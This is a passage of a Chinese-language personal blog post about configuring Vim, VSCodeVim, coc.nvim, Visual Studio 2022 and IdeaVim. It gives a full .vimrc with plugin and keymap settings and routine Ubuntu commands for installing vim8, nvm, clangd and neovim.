&lt;desired&gt;</code></th><th>Add <code>desired</code> surround around text defined by <code>&lt;motion&gt;</code></th></tr></thead><tbody><tr><td><code>d s &lt;existing&gt;</code></td><td>Delete <code>existing</code> surround</td></tr><tr><td><code>c s &lt;existing&gt; &lt;desired&gt;</code></td><td>Change <code>existing</code> surround to <code>desired</code></td></tr></tbody></table><table><thead><tr><th><code>S &lt;desired&gt;</code></th><th>Surround when in visual modes (surrounds full selection)</th></tr></thead><tbody><tr><td></td><td>这样就可以用vaw方便的 S引号 方便的给一个单词加上引号</td></tr></tbody></table><p> 然后我把这个插件”vim.sneak”: true打开了 s<char><char>可以向前跳到char char</char></char></p><p>S<char><char>可以向后跳到char char分号跳到下一个原本的s是删除一个字符并修改我用不到，可以用r修改，单词平常都是b cw或ciw来删除并修改</char></char></p><p><a href="https://github.com/VSCodeVim/Vim">https://github.com/VSCodeVim/Vim</a> 里还有好多有用的</p><h2 id="VIM-1"><a href="#VIM-1" class="headerlink" title="VIM"></a>VIM</h2><p>~&#x2F;.vimrc</p><p><a href="https://vimawesome.com/">https://vimawesome.com/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https:<span class="comment">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br></pre></td></tr></table></figure><p>cocnvim <a href="https://github.com/neoclide/coc.nvim">https://github.com/neoclide/coc.nvim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nodejs &gt;= <span class="number">14.14</span></span><br><span class="line">curl -o- https:<span class="comment">//raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash</span></span><br><span class="line">使用的是 zsh 或 fish，需要将安装脚本中的 bash 替换为 zsh 或 fish</span><br><span class="line">nvm install <span class="number">16</span>    </span><br><span class="line">nvm use <span class="number">16</span></span><br></pre></td></tr></table></figure><p>各语言支持 <a href="https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions">https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install clangd</span><br><span class="line">sudo apt install clang-format</span><br><span class="line">:CocInstall coc-clangd</span><br><span class="line">:CocInstall coc-pyright</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;高亮搜索结果</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span>智能推测搜索，搜索<span class="built_in">set</span>时大小写敏感，<span class="built_in">set</span>不敏感</span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="string">&quot;滚动上下缓存5行</span></span><br><span class="line"><span class="string">set scrolloff=5</span></span><br><span class="line"><span class="string">set clipboard=unnamedplus</span></span><br><span class="line"><span class="string">set t_Co=256</span></span><br><span class="line"><span class="string">if has(&quot;</span>termguicolors<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    &quot;</span> fix bug <span class="keyword">for</span> vim</span><br><span class="line">    <span class="built_in">set</span> t_8f=[<span class="number">38</span>;<span class="number">2</span>;%lu;%lu;%lum <span class="string">&quot; 这里^[[38中的^[需要替换,使用ctrol+v然后按esc</span></span><br><span class="line"><span class="string">    set t_8b=[48;2;%lu;%lu;%lum &quot;</span> 这里^[[<span class="number">38</span>中的^[需要替换,使用ctrol+v然后按esc</span><br><span class="line">    <span class="string">&quot; enable true color</span></span><br><span class="line"><span class="string">    set termguicolors</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">&quot;</span>插入模式显示绝对行号</span><br><span class="line"><span class="string">&quot;其他模式显示相对行号</span></span><br><span class="line"><span class="string">set cursorline</span></span><br><span class="line"><span class="string">set number             &quot;</span> Enable line numbering</span><br><span class="line"><span class="string">&quot; augroup numbertoggle   &quot;</span> Toggles relativenumber on and off based on mode</span><br><span class="line"><span class="string">&quot;     autocmd!</span></span><br><span class="line"><span class="string">&quot;</span>     autocmd BufEnter,FocusGained,InsertLeave * <span class="built_in">set</span> relativenumber</span><br><span class="line"><span class="string">&quot;     autocmd BufLeave,FocusLost,InsertEnter   * set norelativenumber</span></span><br><span class="line"><span class="string">&quot;</span> augroup END</span><br><span class="line"><span class="built_in">set</span> mouse=a</span><br><span class="line"><span class="string">&quot; add tab space</span></span><br><span class="line"><span class="string">set ts=2</span></span><br><span class="line"><span class="string">set softtabstop=2</span></span><br><span class="line"><span class="string">set shiftwidth=2</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">set cindent</span></span><br><span class="line"><span class="string">set autoindent</span></span><br><span class="line"><span class="string">inoremap jk  &lt;ESC&gt;</span></span><br><span class="line"><span class="string">nnoremap &lt;s-k&gt; gt</span></span><br><span class="line"><span class="string">nnoremap &lt;s-J&gt; gT</span></span><br><span class="line"><span class="string">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call plug#begin()</span></span><br><span class="line"><span class="string">Plug &#x27;voldikss/vim-floaterm&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_toggle = &#x27;jt&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_new    = &#x27;&lt;F7&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_prev   = &#x27;&lt;F8&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:floaterm_keymap_next   = &#x27;&lt;F9&gt;&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;mg979/vim-visual-multi&#x27;, &#123;&#x27;branch&#x27;: &#x27;master&#x27;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps                       = &#123;&#125;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Under&#x27;]         = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">let g:VM_maps[&#x27;Find Subword Under&#x27;] = &#x27;&lt;C-j&gt;&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>最近打开文件</span><br><span class="line">Plug <span class="string">&#x27;mhinz/vim-startify&#x27;</span></span><br><span class="line"><span class="string">&quot;任务栏美化</span></span><br><span class="line"><span class="string">Plug &#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>自动括号</span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="string">&quot;彩虹括号</span></span><br><span class="line"><span class="string">Plug &#x27;luochen1990/rainbow&#x27;</span></span><br><span class="line"><span class="string">let g:rainbow_active = 1</span></span><br><span class="line"><span class="string">Plug &#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"><span class="string">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>vim-sneak</span><br><span class="line">Plug <span class="string">&#x27;justinmk/vim-sneak&#x27;</span></span><br><span class="line">let g:sneak<span class="meta">#label = 1</span></span><br><span class="line"><span class="string">&quot;vim-surround</span></span><br><span class="line"><span class="string">Plug &#x27;tpope/vim-surround&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>vim-commentary</span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-commentary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;theme</span></span><br><span class="line"><span class="string">Plug &#x27;joshdick/onedark.vim&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;sainnhe/edge&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;rakr/vim-one&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>coc.nvim</span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">Plug <span class="string">&#x27;easymotion/vim-easymotion&#x27;</span></span><br><span class="line"><span class="string">&quot; 代码格式化 nvim需要单独安装python</span></span><br><span class="line"><span class="string">Plug &#x27;vim-autoformat/vim-autoformat&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;vim-scripts/argtextobj.vim&#x27;</span></span><br><span class="line"><span class="string">call plug#end()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>不知道为什么全局的配置用不了，只能牺牲一点点性能</span><br><span class="line"><span class="string">&quot; clang-format -style=google -dump-config &gt; .clang-format 把谷歌风格生成到文件里</span></span><br><span class="line"><span class="string">&quot;</span> 自动拷贝根目录下的 .clang-format 文件到当前目录</span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> augroup copy_clang_format</span><br><span class="line"><span class="string">&quot;   autocmd!</span></span><br><span class="line"><span class="string">&quot;</span>   autocmd BufNewFile,BufRead *.c,*.cpp execute <span class="string">&#x27;silent! !cp /home/grxer/.clang-format &#x27;</span> . expand(<span class="string">&#x27;%:p:h&#x27;</span>) . <span class="string">&#x27;/.clang-format&#x27;</span></span><br><span class="line"><span class="string">&quot; augroup END</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>把格式换该行绑定到f4</span><br><span class="line">noremap &lt;F4&gt; :AutoformatLine&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 设置主体</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if has(&quot;</span>termguicolors<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    set termguicolors</span></span><br><span class="line"><span class="string">endif</span></span><br><span class="line"><span class="string">&quot;</span> 晚上<span class="number">10</span>点到早上<span class="number">7</span>点用黑色</span><br><span class="line"><span class="string">&quot; if strftime(&quot;</span>%H<span class="string">&quot;) &gt;= 23 || strftime(&quot;</span>%H<span class="string">&quot;) &lt;= 7</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> let g:onedark_terminal_italics=<span class="number">1</span></span><br><span class="line">    let g:oedark_hide_endofbuffer=<span class="number">1</span></span><br><span class="line">    let g:onedark_termcolors=<span class="number">1</span></span><br><span class="line">    <span class="built_in">set</span> background=dark</span><br><span class="line">    colorscheme onedark</span><br><span class="line"><span class="string">&quot;else</span></span><br><span class="line"><span class="string">&quot;</span>    <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line"><span class="string">&quot;      if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">&quot;</span>        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>        let $NVIM_TUI_ENABLE_TRUE_COLOR=<span class="number">1</span></span><br><span class="line"><span class="string">&quot;      endif</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">&quot;</span>      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line"><span class="string">&quot;        set termguicolors</span></span><br><span class="line"><span class="string">&quot;</span>      endif</span><br><span class="line"><span class="string">&quot;    endif</span></span><br><span class="line"><span class="string">&quot;</span>    let g:current_colorscheme = <span class="string">&quot;one&quot;</span></span><br><span class="line"><span class="string">&quot;    set background=light</span></span><br><span class="line"><span class="string">&quot;</span>    let g:one_allow_italics = <span class="number">1</span> </span><br><span class="line"><span class="string">&quot;    colorscheme one</span></span><br><span class="line"><span class="string">&quot;</span>endif</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 切换主题函数</span></span><br><span class="line"><span class="string">function! ToggleColorscheme()</span></span><br><span class="line"><span class="string">  if g:current_colorscheme == &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>one<span class="string">&quot;</span></span><br><span class="line"><span class="string">    set background=light</span></span><br><span class="line"><span class="string">    let g:one_allow_italics = 1 </span></span><br><span class="line"><span class="string">    &quot;</span>Credit joshdick</span><br><span class="line">    <span class="string">&quot;Use 24-bit (true-color) mode in Vim/Neovim when outside tmux.</span></span><br><span class="line"><span class="string">    &quot;</span>If yo<span class="string">u&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;</span>s <span class="number">24</span>-bit color support</span><br><span class="line">    <span class="string">&quot;(see &lt; http://sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line"><span class="string">    if (empty($TMUX))</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>nvim<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        &quot;</span>For Neovim <span class="number">0.1</span><span class="number">.3</span> and <span class="number">0.1</span><span class="number">.4</span> &lt; https:<span class="comment">//github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line">        let $NVIM_TUI_ENABLE_TRUE_COLOR=<span class="number">1</span></span><br><span class="line">      endif</span><br><span class="line">      <span class="string">&quot;For Neovim &gt; 0.1.5 and Vim &gt; patch 7.4.1799 &lt; https://github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line"><span class="string">      &quot;</span>Based on Vim patch <span class="number">7.4</span><span class="number">.1770</span> (`guicolors` option) &lt; https:<span class="comment">//github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line">      <span class="string">&quot; &lt; https://github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line"><span class="string">      if (has(&quot;</span>termguicolors<span class="string">&quot;))</span></span><br><span class="line"><span class="string">        set termguicolors</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">    colorscheme one </span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">    let g:onedark_terminal_italics=1</span></span><br><span class="line"><span class="string">    let g:oedark_hide_endofbuffer=1</span></span><br><span class="line"><span class="string">    let g:onedark_termcolors=1</span></span><br><span class="line"><span class="string">    set background=dark</span></span><br><span class="line"><span class="string">    &quot;</span>Use <span class="number">24</span>-bit (<span class="literal">true</span>-color) mode in Vim/Neovim when outside tmux.</span><br><span class="line">    <span class="string">&quot;If you&#x27;re using tmux version 2.2 or later, you can remove the outermost $TMUX check and use tmux&#x27;s 24-bit color support</span></span><br><span class="line"><span class="string">    &quot;</span>(see &lt; http:<span class="comment">//sunaku.github.io/tmux-24bit-color.html#usage &gt; for more information.)</span></span><br><span class="line">    <span class="keyword">if</span> (empty($TMUX))</span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;nvim&quot;</span>))</span><br><span class="line">        <span class="string">&quot;For Neovim 0.1.3 and 0.1.4 &lt; https://github.com/neovim/neovim/pull/2198 &gt;</span></span><br><span class="line"><span class="string">        let $NVIM_TUI_ENABLE_TRUE_COLOR=1</span></span><br><span class="line"><span class="string">      endif</span></span><br><span class="line"><span class="string">      &quot;</span>For Neovim &gt; <span class="number">0.1</span><span class="number">.5</span> and Vim &gt; patch <span class="number">7.4</span><span class="number">.1799</span> &lt; https:<span class="comment">//github.com/vim/vim/commit/61be73bb0f965a895bfb064ea3e55476ac175162 &gt;</span></span><br><span class="line">      <span class="string">&quot;Based on Vim patch 7.4.1770 (`guicolors` option) &lt; https://github.com/vim/vim/commit/8a633e3427b47286869aa4b96f2bfc1fe65b25cd &gt;</span></span><br><span class="line"><span class="string">      &quot;</span> &lt; https:<span class="comment">//github.com/neovim/neovim/wiki/Following-HEAD#20160511 &gt;</span></span><br><span class="line">      <span class="keyword">if</span> (has(<span class="string">&quot;termguicolors&quot;</span>))</span><br><span class="line">        <span class="built_in">set</span> termguicolors</span><br><span class="line">      endif</span><br><span class="line">    endif</span><br><span class="line">    colorscheme onedark </span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 设置快捷键切换主题</span></span><br><span class="line"><span class="string">nnoremap &lt;C-F6&gt; :call ToggleColorscheme()&lt;CR&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">&quot;cocnvim配置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>用tab和shitft tab来切换提示，回车补全</span><br><span class="line"><span class="string">&quot; Use tab for trigger completion with characters ahead and navigate</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: There<span class="number">&#x27;</span>s always complete item selected by <span class="keyword">default</span>, you may want to enable</span><br><span class="line"><span class="string">&quot; no select by `&quot;</span>suggest.noselect<span class="string">&quot;: true` in your configuration file</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: Use command <span class="string">&#x27;:verbose imap &lt;tab&gt;&#x27;</span> to make sure tab is not mapped by</span><br><span class="line"><span class="string">&quot; other plugin before putting this into your config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>将选择下一个提示改为tab</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#pum#visible() ? coc#pum#next(1) :</span></span><br><span class="line"><span class="string">&quot;       \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;将shift tab改为上一个补全</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt;&lt;S-TAB&gt; coc#pum#visible() ? coc#pum#prev(1) : &quot;</span>\&lt;C-h&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> Make &lt;CR&gt; to accept selected completion item or notify coc.nvim to format</span><br><span class="line"><span class="string">&quot; &lt;C-g&gt;u breaks current undo, please make your own choice</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>回车补全</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;CR&gt; coc#pum#visible() ? coc#pum#confirm()</span></span><br><span class="line"><span class="string">                              &quot;</span> \: <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="string">&quot;tab补全修改为 ctrl j和ctrl k左右移动参数</span></span><br><span class="line"><span class="string">inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">      \ pumvisible() ? &quot;</span>\&lt;C-y&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">      \ &quot;</span>\&lt;TAB&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function! CheckBackspace() abort</span></span><br><span class="line"><span class="string">  let col = col(&#x27;.&#x27;) - 1</span></span><br><span class="line"><span class="string">  return !col || getline(&#x27;.&#x27;)[col - 1]  =~# &#x27;\s&#x27;</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>cocnvim config</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Having longer updatetime (default is 4000 ms = 4s) leads to noticeable</span></span><br><span class="line"><span class="string">&quot;</span> delays and poor user experience</span><br><span class="line"><span class="string">&quot; 使用提示更快</span></span><br><span class="line"><span class="string">set updatetime=200</span></span><br><span class="line"><span class="string">&quot;</span> Always show the signcolumn, otherwise it would shift the text each time</span><br><span class="line"><span class="string">&quot; diagnostics appear/become resolved</span></span><br><span class="line"><span class="string">set signcolumn=yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ctrl o 提示补全</span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-o&gt; coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;用空格+和空格-查找代码报错</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;- &lt;Plug&gt;(coc-diagnostic-prev)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;= &lt;Plug&gt;(coc-diagnostic-next)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>转到函数声明定义引用等</span><br><span class="line"><span class="string">&quot; GoTo code navigation</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gd &lt;Plug&gt;(coc-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gy &lt;Plug&gt;(coc-type-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gi &lt;Plug&gt;(coc-implementation)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gr &lt;Plug&gt;(coc-references)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>g+h显示函数等的帮助文档</span><br><span class="line">nnoremap &lt;silent&gt; gh :call ShowDocumentation()&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">function! ShowDocumentation()</span><br><span class="line">  <span class="keyword">if</span> CocAction(<span class="string">&#x27;hasProvider&#x27;</span>, <span class="string">&#x27;hover&#x27;</span>)</span><br><span class="line">    call CocActionAsync(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    call feedkeys(<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;in&#x27;</span>)</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;高亮光标处所有一样的词</span></span><br><span class="line"><span class="string">&quot;</span> Highlight the symbol and its references when holding the cursor</span><br><span class="line">autocmd CursorHold * silent call CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;重命名变量 leader默认是\ 把他改为了空格</span></span><br><span class="line"><span class="string">&quot;</span> Symbol renaming</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">nmap &lt;leader&gt;rn &lt;Plug&gt;(coc-rename)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;空格f空格 格式化化代码，不过tab缩进是2 不知道怎么改 </span></span><br><span class="line"><span class="string">&quot;</span> Formatting selected code</span><br><span class="line"><span class="string">&quot; xmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span></span><br><span class="line"><span class="string">&quot;</span> nmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Applying code actions to the selected code block</span></span><br><span class="line"><span class="string">&quot;</span> Example: `&lt;leader&gt;aap` <span class="keyword">for</span> current paragraph</span><br><span class="line">xmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line">nmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;快速选中函数里的或类类的东西,a和i的区别就是选中和不选中函数或类名字</span></span><br><span class="line"><span class="string">&quot;</span> Map function and class text objects</span><br><span class="line"><span class="string">&quot; NOTE: Requires &#x27;textDocument.documentSymbol&#x27; support from the language server</span></span><br><span class="line"><span class="string">xmap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">omap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">xmap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">omap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">xmap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">omap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">xmap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br><span class="line"><span class="string">omap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br></pre></td></tr></table></figure><p>PlugInstall</p><h4 id="Ubuntu16安装cocnvim"><a href="#Ubuntu16安装cocnvim" class="headerlink" title="Ubuntu16安装cocnvim"></a>Ubuntu16安装cocnvim</h4><p>先添加源升级vim8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:jonathonf/vim</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>clangd添加源安装</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vim  /etc/apt/sources.<span class="built_in">list</span>添加下面的源</span><br><span class="line">deb http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">deb-src http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">如果签名错误 W: GPG error: https:<span class="comment">//apt.llvm.org/xenial llvm-toolchain-xenial InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY 15CF4D18AF4F7421</span></span><br><span class="line">执行</span><br><span class="line">wget -O - https:<span class="comment">//apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add -</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install clangd</span><br></pre></td></tr></table></figure><p>卸载</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install ppa-purge &amp;&amp; sudo ppa-purge ppa:jonathonf/vim</span><br></pre></td></tr></table></figure><h2 id="vs2022"><a href="#vs2022" class="headerlink" title="vs2022"></a>vs2022</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line">nmap &lt;C-O&gt; :vsc View.NavigateBackward&lt;CR&gt;</span><br><span class="line">nmap &lt;C-I&gt; :vsc View.NavigateForward&lt;CR&gt;</span><br><span class="line">nmap gd :vsc Edit.GoToDefinition&lt;CR&gt;</span><br><span class="line">nmap gh :vsc Edit.QuickInfo&lt;CR&gt;</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="ideavim"><a href="#ideavim" class="headerlink" title="ideavim"></a>ideavim</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">inoremap jk &lt;ESC&gt;</span><br><span class="line"><span class="built_in">set</span> sneak</span><br><span class="line"><span class="built_in">set</span> surround</span><br><span class="line"><span class="built_in">set</span> commentary</span><br><span class="line"><span class="built_in">set</span> argtextobj</span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="built_in">set</span> scrolloff=<span class="number">5</span></span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"><span class="built_in">set</span> expandtab</span><br><span class="line"><span class="built_in">set</span> cindent</span><br><span class="line"><span class="built_in">set</span> autoindento</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">Plug <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;vim-easymotion&#x27;</span></span><br><span class="line"><span class="built_in">map</span> &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"><span class="built_in">set</span> clipboard+=unnamed</span><br><span class="line"><span class="built_in">set</span> incsearch</span><br><span class="line"><span class="built_in">map</span> &lt;Leader&gt; &lt;Plug&gt;(easymotion-prefix)</span><br><span class="line"><span class="built_in">map</span> &lt;leader&gt;rn &lt;Action&gt;(RenameElement)</span><br><span class="line"><span class="built_in">map</span> gp &lt;Action&gt;(ParameterInfo)  </span><br><span class="line"><span class="built_in">map</span> gh &lt;Action&gt;(ShowErrorDescription)</span><br><span class="line"><span class="built_in">map</span> gi &lt;Action&gt;(QuickImplementations)</span><br><span class="line"><span class="built_in">map</span> gm &lt;Action&gt;(QuickJavaDoc)</span><br><span class="line"><span class="built_in">set</span> noerrorbells</span><br><span class="line"><span class="built_in">set</span> visualbell</span><br><span class="line"><span class="built_in">set</span> showmode</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br><span class="line">nnoremap == :&lt;C-u&gt;action ReformatCode&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="vim–-gt-neovim"><a href="#vim–-gt-neovim" class="headerlink" title="vim–&gt;neovim"></a>vim–&gt;neovim</h2><p>9.0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo snap install nvim  --classic</span><br></pre></td></tr></table></figure><p><a 